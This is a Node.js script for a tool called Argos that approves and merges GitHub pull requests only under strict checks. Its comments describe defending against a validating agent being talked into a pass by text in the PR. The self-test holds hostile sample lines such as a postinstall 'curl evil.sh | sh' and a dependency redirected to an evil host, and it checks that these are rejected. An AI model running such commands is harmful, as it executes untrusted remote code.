#!/usr/bin/env node
// Argos merge: approves and merges a validated PR, only in a repo the user turned it on for
// (`repos.mjs merge <repo> on`) and only under a strict rule. The mod runs it, never the agent
// that validated: the validation stays read-only, and this script decides from facts alone.
//
// The rule, all of it:
//   - the verdict passed: no blocker, nothing needing attention, not partial
//   - the verdict is on the head commit, the PR is open and not a draft
//   - the PR is not the user's own (GitHub does not let anyone approve their own)
//   - it comes from a branch of the repo itself, never a fork, and its author may already write to
//     the repo, or is an app that only moves versions (Dependabot, Renovate): lock files, or a
//     package.json whose diff changes nothing but versions. A coding agent does not pass: it writes
//     code from instructions anyone may have left it. Nor does a Dockerfile, a workflow or a script:
//     they run on install, build or CI. A verdict reads the PR's own text, so it can be talked into
//     passing; this script decides on facts the PR cannot write
//   - the gate finds nothing in the diff (a secret, a risky workflow line, an agent's config): the verdict may come from
//     the person's prompt alone, so this script looks by itself
//   - no conflicts, and every CI check passed (no checks at all is not green)
//   - after the approval, GitHub says it can merge (required reviews and rules satisfied)
// Merge uses the first method the repo allows (squash, merge commit, rebase), pinned to the head
// commit, so a push in between makes the merge fail instead of merging unvalidated code. An approval
// of Argos that a push outdated is dismissed: not every repo does that by itself, and it would
// stand for code nobody validated.
//
// Usage:
//   node merge.mjs sweep          every passing verdict in an opted-in repo with no outcome yet
//   node merge.mjs --self-test
// Each outcome lands on the verdict (merge: { state: merged | approved | skipped, why, sha, at }).
// A commit is looked at again each round until its outcome stands: CI still running, more reviews
// needed or a network error may change; a fork or a merged PR will not. It is approved only once.
// A PR left to humans (verdicts.mjs human) is never approved or merged. Env: ARGOS_STATE, as the other scripts.
import { execFileSync } from "node:child_process";
import { closeSync, existsSync, mkdirSync, openSync, rmSync, statSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join } from "node:path";
import assert from "node:assert/strict";
import { scan } from "./gate.mjs";
import { add as addHistory } from "./history.mjs";
import { read as readRepos } from "./repos.mjs";
import { onlyUpkeep, pinsOnly } from "./upkeep.mjs";
import { nap, read, withLock, write } from "./verdicts.mjs";
import { isMain } from "./is-main.mjs";

export const repoOf = (url) => url.match(/github\.com\/([^/]+\/[^/]+)\/pull\//)?.[1] ?? "";
export const sameSha = (a = "", b = "") => Boolean(a && b) && (a.startsWith(b) || b.startsWith(a));
const GREEN = new Set(["SUCCESS", "NEUTRAL", "SKIPPED"]);
const WRITERS = new Set(["admin", "write"]);
// Skips that no later round can change, for this commit.
const RISKY = "secret, risky workflow or agent config";
const FINAL = new Set(["not open", "your PR", "from a fork", "author cannot write", "coding agent", "changes build or CI", RISKY]);
const REVIEW_BODY = "Argos: validated with no blockers and nothing needing attention.";
// Said on the PR's line until the dismissal goes through; view.ts shows it over "new commits".
const OLD_APPROVAL = "stale approval: dismiss it on GitHub";
// Past this a sweep stops and the next round goes on: the mod kills it at 120 s, and one PR may take
// tens of seconds more.
const SWEEP_MS = 60_000;
const running = (c) => c.state === "PENDING" || c.state === "EXPECTED" || (Boolean(c.status) && c.status !== "COMPLETED");

// A passing verdict: the only ones this script looks at; the rest show their own verdict.
export const passes = (v) => v?.state === "done" && v.issues === 0 && !v.attention && !v.partial;

// From `gh pr view --json state,isDraft,headRefOid,author,isCrossRepository,files,mergeable,statusCheckRollup`
// and the author's permission on the repo: null when it may be approved, else the reason it is
// skipped, in a few words. What it cannot tell counts against: no answer never lets a PR through.
export function gate(pr, verdict, me, access) {
  if (pr.state !== "OPEN" || pr.isDraft) return "not open";
  if (!sameSha(pr.headRefOid, verdict.sha)) return "new commits";
  if (me && pr.author?.login?.toLowerCase() === me.toLowerCase()) return "your PR";
  if (pr.isCrossRepository !== false) return "from a fork";
  if (pr.author?.is_bot) {
    const files = pr.files ?? [];
    if (!onlyUpkeep(files.map((f) => f.path))) return "coding agent";
    if (!files.every(pinsOnly)) return "changes build or CI";
  } else if (!WRITERS.has(access)) return access ? "author cannot write" : "author access unknown";
  if (pr.mergeable !== "MERGEABLE") return pr.mergeable === "CONFLICTING" ? "conflicts" : "mergeability unknown";
  const checks = pr.statusCheckRollup ?? [];
  if (!checks.length) return "no CI";
  if (checks.some((c) => !running(c) && !GREEN.has(c.conclusion ?? c.state ?? ""))) return "CI red";
  return checks.some(running) ? "CI pending" : null;
}

// Whether this commit's outcome stands, so no round needs to look at it again.
export const settled = (verdict) => {
  const m = verdict.merge;
  return m?.sha === verdict.sha && (m.state === "merged" || FINAL.has(m.why));
};

// Argos's own approvals, from `pulls/<n>/reviews`. The person shares the account: the body tells
// theirs apart, and theirs stays.
export const ownApprovals = (reviews, me) => reviews.filter((r) => r.state === "APPROVED" && r.user?.login?.toLowerCase() === me.toLowerCase() && Boolean(r.body?.startsWith("Argos:")));

// Why GitHub would not merge an approved PR, from its mergeStateStatus.
const blockedBy = (status) => ({ BEHIND: "behind base: update the branch on GitHub", UNKNOWN: "mergeability unknown", DIRTY: "conflicts" })[status] ?? "needs more reviews";

// GitHub works mergeability out on demand, and each merge starts it over for the repo's other PRs.
const whenKnown = (ask, field) => {
  let answer = ask();
  for (let tries = 0; tries < 4 && answer[field] === "UNKNOWN"; tries++) {
    nap(2000);
    answer = ask();
  }
  return answer;
};
export const lines = (out) => out.split("\n").filter(Boolean).map((l) => JSON.parse(l));
const pullPath = (url) => `repos/${repoOf(url)}/pulls/${url.split("/").at(-1)}`;
const reviewsOf = (run, url) => lines(run(["api", "--paginate", `${pullPath(url)}/reviews`, "-q", ".[] | {id, state, body, commit_id, user: {login: .user.login}}"]));

// The repo's first allowed method, as a gh pr merge flag.
export const method = (r) => (r.allow_squash_merge ? "--squash" : r.allow_merge_commit ? "--merge" : r.allow_rebase_merge ? "--rebase" : null);

// One sweep at a time, across sessions: two would both approve. Held past 5 minutes, it is stale.
const SWEEP_LOCK = join(dirname(process.env.ARGOS_STATE ?? join(homedir(), ".claude", "kl-akasha", "argos", "state.json")), "merge.lock");
function sweep() {
  try {
    mkdirSync(dirname(SWEEP_LOCK), { recursive: true });
    if (existsSync(SWEEP_LOCK) && Date.now() - statSync(SWEEP_LOCK).mtimeMs > 300_000) rmSync(SWEEP_LOCK, { force: true });
    closeSync(openSync(SWEEP_LOCK, "wx"));
  } catch {
    return [];
  }
  try {
    return sweepAll();
  } finally {
    rmSync(SWEEP_LOCK, { force: true });
  }
}

// As the account this repo is connected with.
export const asAccount = (repos, url) => {
  const account = repos.find((r) => r.repo.toLowerCase() === repoOf(url).toLowerCase())?.account;
  const env = account ? { ...process.env, GH_TOKEN: gh(["auth", "token", "-u", account]) } : process.env;
  return (args) => gh(args, env);
};

// Takes back what a push outdated or a newer verdict on the same commit refuted, also where auto-merge
// went off since. Returns the PRs it could not: they wait, each saying so, and the next round tries again.
function retract(repos, until) {
  const stuck = new Set();
  for (const [url, sha] of Object.entries(read().approved)) {
    if (Date.now() > until) break;
    try {
      const run = asAccount(repos, url);
      const pr = JSON.parse(run(["pr", "view", url, "--json", "state,headRefOid"]));
      const verdict = read().prs[url];
      const refuted = verdict?.state === "done" && sameSha(verdict.sha, sha) && !passes(verdict);
      if (pr.state === "OPEN" && sameSha(pr.headRefOid, sha) && !refuted) continue;
      if (pr.state === "OPEN")
        for (const r of ownApprovals(reviewsOf(run, url), run(["api", "user", "-q", ".login"])))
          if (refuted || r.commit_id !== pr.headRefOid)
            run(["api", "-X", "PUT", `${pullPath(url)}/reviews/${r.id}/dismissals`, "-f", `message=Argos: ${refuted ? "a newer validation did not pass" : "new commits since this approval"}.`]);
      withLock(() => {
        const now = read();
        const { [url]: _, ...approved } = now.approved;
        const prs = { ...now.prs };
        if (prs[url]?.merge?.why === OLD_APPROVAL) {
          const { merge: __, ...rest } = prs[url];
          prs[url] = rest;
        }
        write({ ...now, approved, prs });
      });
    } catch {
      stuck.add(url);
      withLock(() => {
        const now = read();
        if (now.prs[url]) write({ ...now, prs: { ...now.prs, [url]: { ...now.prs[url], merge: { state: "skipped", why: OLD_APPROVAL, sha: now.prs[url].sha, at: new Date().toISOString() } } } });
      });
    }
  }
  return stuck;
}

function sweepAll() {
  const all = readRepos();
  const until = Date.now() + SWEEP_MS;
  const stuck = retract(all, until);
  const repos = all.filter((r) => r.merge);
  if (!repos.length) return [];
  const v = read();
  const done = [];
  for (const [url, verdict] of Object.entries(v.prs)) {
    if (Date.now() > until) break;
    const cfg = repos.find((r) => r.repo.toLowerCase() === repoOf(url).toLowerCase());
    if (!cfg || !passes(verdict) || settled(verdict) || v.human?.includes(url) || stuck.has(url)) continue;
    let approved = verdict.merge?.sha === verdict.sha && verdict.merge.state === "approved";
    let outcome;
    try {
      const run = asAccount(repos, url);
      const pr = whenKnown(() => JSON.parse(run(["pr", "view", url, "--json", "state,isDraft,headRefOid,author,isCrossRepository,mergeable,statusCheckRollup"])), "mergeable");
      if (pr.author?.is_bot) pr.files = lines(run(["api", "--paginate", `${pullPath(url)}/files`, "-q", ".[] | {path: .filename, patch}"]));
      const me = run(["api", "user", "-q", ".login"]);
      const why = gate(pr, verdict, me, pr.author?.is_bot ? undefined : accessOf(run, repoOf(url), pr.author?.login)) ?? (scan(run(["pr", "diff", url])).length ? RISKY : null);
      // approved stays on the record, so no later round approves again; new commits took it back
      if (why) outcome = { state: approved && why !== "new commits" ? "approved" : "skipped", why };
      else {
        // GitHub knows what the record may have lost: a kill, or a validation run again on this commit
        approved ||= ownApprovals(reviewsOf(run, url), me).some((r) => r.commit_id === pr.headRefOid);
        if (!approved) {
          // noted first: a note with no approval is harmless, an approval with no note never goes away
          withLock(() => {
            const now = read();
            write({ ...now, approved: { ...now.approved, [url]: pr.headRefOid } });
          });
          // on the commit the verdict is for: gh pr review would take whatever the head is by now
          run(["api", "-X", "POST", `${pullPath(url)}/reviews`, "-f", "event=APPROVE", "-f", `commit_id=${pr.headRefOid}`, "-f", `body=${REVIEW_BODY}`]);
          approved = true;
        }
        const after = whenKnown(() => JSON.parse(run(["pr", "view", url, "--json", "mergeStateStatus"])), "mergeStateStatus");
        const how = method(JSON.parse(run(["api", `repos/${repoOf(url)}`])));
        if (after.mergeStateStatus !== "CLEAN" || !how) outcome = { state: "approved", why: how ? blockedBy(after.mergeStateStatus) : "no merge method allowed" };
        else {
          run(["pr", "merge", url, how, "--match-head-commit", pr.headRefOid]);
          outcome = { state: "merged", why: how.slice(2) };
        }
      }
    } catch (err) {
      // once approved it stays approved in the record, even when the merge after it failed
      outcome = { state: approved ? "approved" : "skipped", why: String(err.message ?? err).split("\n")[0].slice(0, 80) };
    }
    // read again: a validation may have landed while GitHub answered
    withLock(() => {
      const now = read();
      if (now.prs[url]?.sha === verdict.sha) write({ ...now, prs: { ...now.prs, [url]: { ...now.prs[url], merge: { ...outcome, sha: verdict.sha, at: new Date().toISOString() } } } });
    });
    // what was done in the person's name, once; a skip or a repeated approval is no event
    if (outcome.state !== "skipped" && verdict.merge?.state !== outcome.state) addHistory({ kind: "merge", url, sha: verdict.sha, state: outcome.state, why: outcome.why, at: new Date().toISOString() });
    done.push({ url, ...outcome });
  }
  return done;
}

// The author's permission on the repo, or undefined when GitHub does not say.
function accessOf(run, repo, login) {
  try {
    return login ? run(["api", `repos/${repo}/collaborators/${login}/permission`, "-q", ".permission"]) : undefined;
  } catch {
    return undefined;
  }
}

function gh(args, env = process.env) {
  return execFileSync("gh", args, { encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"], timeout: 20_000 }).trim();
}

function selfTest() {
  const ok = { state: "OPEN", isDraft: false, headRefOid: "abc1234def", author: { login: "bia" }, isCrossRepository: false, mergeable: "MERGEABLE", statusCheckRollup: [{ conclusion: "SUCCESS" }, { state: "SUCCESS" }, { conclusion: "SKIPPED" }] };
  const v = { state: "done", sha: "abc1234", issues: 0, attention: 0, partial: false };
  assert.equal(passes(v), true);
  assert.equal(passes({ ...v, attention: 1 }), false);
  assert.equal(passes({ ...v, partial: true }), false);
  assert.equal(passes({ ...v, issues: 2 }), false);
  assert.equal(passes({ state: "running" }), false);
  assert.equal(gate(ok, v, "me", "write"), null);
  assert.equal(gate(ok, v, "me", "admin"), null);
  assert.equal(gate({ ...ok, headRefOid: "fff9999" }, v, "me", "write"), "new commits");
  assert.equal(gate(ok, v, "BIA", "write"), "your PR");
  assert.equal(gate({ ...ok, isDraft: true }, v, "me", "write"), "not open");
  assert.equal(gate({ ...ok, mergeable: "CONFLICTING" }, v, "me", "write"), "conflicts");
  assert.equal(gate({ ...ok, statusCheckRollup: [] }, v, "me", "write"), "no CI");
  assert.equal(gate({ ...ok, statusCheckRollup: [{ conclusion: "FAILURE" }] }, v, "me", "write"), "CI red");
  // a check still running is not green either
  assert.equal(gate({ ...ok, statusCheckRollup: [{ status: "IN_PROGRESS", conclusion: "" }] }, v, "me", "write"), "CI pending");
  assert.equal(gate({ ...ok, statusCheckRollup: [{ state: "PENDING" }] }, v, "me", "write"), "CI pending");
  // a failed check beats one still running
  assert.equal(gate({ ...ok, statusCheckRollup: [{ status: "IN_PROGRESS" }, { status: "COMPLETED", conclusion: "FAILURE" }] }, v, "me", "write"), "CI red");
  // what a later round can change is looked at again; what it cannot, is not
  const merge = (state, why, sha = v.sha) => ({ ...v, merge: { state, why, sha } });
  assert.equal(settled(v), false);
  assert.equal(settled(merge("merged", "squash")), true);
  assert.equal(settled(merge("skipped", "from a fork")), true);
  assert.equal(settled(merge("skipped", "CI pending")), false);
  assert.equal(settled(merge("approved", "needs more reviews")), false);
  assert.equal(settled(merge("merged", "squash", "other00")), false);
  assert.equal(settled(merge("approved", "from a fork")), true);
  // who opened it: a fork never, even with write access; a person needs write access; no answer
  // counts against; an app passes only when it does nothing but move versions
  assert.equal(gate({ ...ok, isCrossRepository: true }, v, "me", "write"), "from a fork");
  assert.equal(gate({ ...ok, isCrossRepository: undefined }, v, "me", "write"), "from a fork");
  assert.equal(gate(ok, v, "me", "read"), "author cannot write");
  assert.equal(gate(ok, v, "me", "none"), "author cannot write");
  assert.equal(gate(ok, v, "me"), "author access unknown");
  const pin = (name, from, to) => `@@ -1,3 +1,3 @@\n {\n-  "${name}": "${from}",\n+  "${name}": "${to}",\n }`;
  const bump = [{ path: "package.json", patch: pin("lodash", "^4.17.20", "^4.17.21") }, { path: "web/package-lock.json" }];
  assert.equal(gate({ ...ok, author: { login: "app/dependabot", is_bot: true }, files: bump }, v, "me"), null);
  assert.equal(gate({ ...ok, author: { login: "app/copilot-swe-agent", is_bot: true }, files: [...bump, { path: "src/pay.ts" }] }, v, "me"), "coding agent");
  assert.equal(gate({ ...ok, author: { login: "app/dependabot", is_bot: true } }, v, "me"), "coding agent");
  assert.equal(gate({ ...ok, author: { login: "app/evil", is_bot: true }, files: bump, isCrossRepository: true }, v, "me"), "from a fork");
  // upkeep by name, yet it runs on install, build or CI: a script, a new or redirected package, an
  // image, a workflow, a manifest that is code, a diff GitHub left out
  const bot = (files) => gate({ ...ok, author: { login: "app/dependabot", is_bot: true }, files }, v, "me");
  for (const patch of [
    pin("postinstall", "node x.js", "curl evil.sh | sh"),
    '@@ -1 +1,2 @@\n+  "postinstall": "curl evil.sh | sh",',
    pin("postinstall", "1.0.0", "1.0.0 && curl evil.sh"),
    pin("lodash", "4.17.20", "git+https://evil/lodash"),
    '@@ -1 +1,2 @@\n+  "evil": "1.0.0",',
    '@@ -1 +1 @@\n-  "lodash": "4.17.20",\n+  "evil": "1.0.0",',
    undefined,
    null,
  ])
    assert.equal(bot([{ path: "package.json", patch }]), "changes build or CI", patch);
  for (const path of ["Dockerfile", "svc/Dockerfile", ".github/workflows/ci.yml", "Gemfile", "pom.xml", "build.gradle", "pyproject.toml", "Cargo.toml", "app.csproj"])
    assert.equal(bot([{ path }]), "changes build or CI", path);
  assert.equal(bot([{ path: "yarn.lock" }, { path: "go.sum" }]), null);
  assert.equal(bot([{ path: "requirements.txt" }]), "changes build or CI");
  assert.equal(bot([{ path: "go.mod" }, { path: "go.sum" }]), "changes build or CI");
  assert.equal(bot([{ path: "package.json", patch: `${pin("a", "1.0.0", "1.0.1")}\r\n\\ No newline at end of file` }]), null);
  assert.equal(settled(merge("skipped", "changes build or CI")), true);
  // only Argos's own approvals: not the person's
  const review = (o) => ({ state: "APPROVED", user: { login: "Me" }, commit_id: "old", body: REVIEW_BODY, ...o });
  assert.deepEqual(ownApprovals([review({ id: 1 })], "me").map((r) => r.id), [1]);
  assert.deepEqual(ownApprovals([review({ body: "LGTM" }), review({ body: null }), review({ user: { login: "bia" } }), review({ state: "DISMISSED" })], "me"), []);
  assert.equal(blockedBy("BEHIND"), "behind base: update the branch on GitHub");
  assert.equal(blockedBy("BLOCKED"), "needs more reviews");
  // still working it out: asks again; never past the limit
  let asked = 0;
  const known = whenKnown(() => ({ mergeable: asked++ ? "MERGEABLE" : "UNKNOWN" }), "mergeable");
  assert.deepEqual([known.mergeable, asked], ["MERGEABLE", 2]);
  assert.equal(method({ allow_squash_merge: false, allow_merge_commit: true }), "--merge");
  assert.equal(method({}), null);
  console.log("self-test ok");
}

if (isMain(import.meta.url)) {
  const [cmd] = process.argv.slice(2);
  if (cmd === "--self-test") selfTest();
  else if (cmd === "sweep") console.log(JSON.stringify(sweep()));
  else {
    console.error("usage: merge.mjs sweep | --self-test");
    process.exit(1);
  }
}
